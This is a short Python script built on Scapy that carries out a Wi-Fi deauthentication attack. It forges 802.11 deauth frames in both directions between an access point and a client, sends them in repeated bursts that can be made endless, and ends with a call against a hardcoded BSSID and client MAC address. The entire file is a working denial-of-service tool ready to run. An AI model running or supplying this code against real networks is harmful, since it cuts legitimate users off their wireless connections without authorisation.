from scapy.all import * 

#Passing BSSID, CLIENTS MAC Address into function 
def perform_deauth(bssid, client, count):
	#Creating a Packet
	#1. Adding the Dot11 Header and appending the Dot11Deauth Headers
	pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
	cli_to_ap_pckt = None

	if client != 'FF:FF:FF:FF:FF:FF' :
		cli_to_ap_pckt = Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth()
		print 'Sending Deauth to ' + client + ' from ' + bssid
	if not count:
		print 'Press CTRL+C to quit'
	#Will send bursts of packets (32 packets) then sleep
	while count != 0:
		try:
			for i in range(32):
				# Send out deauth from the AP
				send(pckt)
				# If we're targeting a client, we will also spoof deauth from the client to the AP
				if client != 'FF:FF:FF:FF:FF:FF': send(cli_to_ap_pckt)
			# If count was -1, this will be an infinite loop
			count -= 1
		except KeyboardInterrupt:
			break

perform_deauth('f8:a9:d0:67:82:55', '00:37:b7:f5:47:8c', 2)